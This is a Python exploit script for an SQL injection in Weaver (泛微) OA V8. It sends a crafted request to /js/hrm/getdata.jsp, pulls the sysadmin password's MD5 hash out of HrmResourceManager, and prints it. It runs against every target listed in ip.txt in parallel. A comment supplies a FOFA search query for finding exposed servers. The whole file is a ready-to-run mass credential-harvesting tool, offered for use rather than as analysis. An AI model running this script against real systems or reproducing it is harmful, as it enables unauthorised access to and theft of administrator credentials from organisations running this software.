# 泛微OA V8 SQL注入获取管理员(sysadmin)MD5后的密码信息
# fofa:  app="泛微-协同办公OA"

import requests
import urllib3
from  multiprocessing import Pool
urllib3.disable_warnings()

def title():
    print("[-------------------------------------------------]")
    print("[------------    泛微OA V8 SQL注入     ------------]")
    print("[--------    use:python3 weaverSQL.py     --------]")
    print("[------------     Author:Henry4E36    ------------]")
    print("[-------------------------------------------------]")


def target_url(url):
    target_url = url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    # 代理设置
    # proxy = "127.0.0.1:8080"
    # proxies = {
    #     'http': 'http://' + proxy,
    #     'https': 'https://' + proxy
    # }
    try:
        res = requests.get(url=target_url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在SQL注入！\033[0m")
            print("[-]  正在查询sysadmin密码信息.......")
            print(f"[-]  用户: sysadmin    密码MD5: \033[33m{res.text.strip()}\033[0m")
            print("[---------------------------------------------------------------------]")
        else:
            print(f"[0]  目标系统: {url} 不存在SQL注入！\033[0m")
            print("[---------------------------------------------------------------------]")
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n",e)
        print("[---------------------------------------------------------------------]")


if __name__ == "__main__":
    title()
    pool = Pool(processes=10)
    with open("ip.txt","r") as f:
        for url in f:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip()
            pool.apply_async(target_url, args=(url,))
    f.close()
    pool.close()
    pool.join()



